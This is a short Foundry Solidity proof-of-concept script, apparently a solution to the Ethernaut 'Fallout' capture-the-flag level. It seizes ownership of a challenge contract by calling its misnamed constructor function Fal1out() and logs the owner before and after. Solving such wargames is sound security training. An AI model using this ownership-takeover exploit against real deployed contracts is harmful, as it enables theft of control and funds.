// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Script, console2} from "forge-std/Script.sol";

interface IFal1out {
    function Fal1out() external payable;

    function owner() external view returns (address);
}

contract PoC is Script {
    IFal1out fal1out = IFal1out(0x74AeDd06d77592Fbf41dcd0fa39B04894DB78C52); // Replace this with your Fallout instance

    function run() external {
        uint256 deployer = vm.envUint("PRIVATE_KEY");

        vm.startBroadcast(deployer);

        console2.log("Current owner: ", fal1out.owner());
        fal1out.Fal1out();
        console2.log("New owner: ", fal1out.owner());

        vm.stopBroadcast();
    }
}
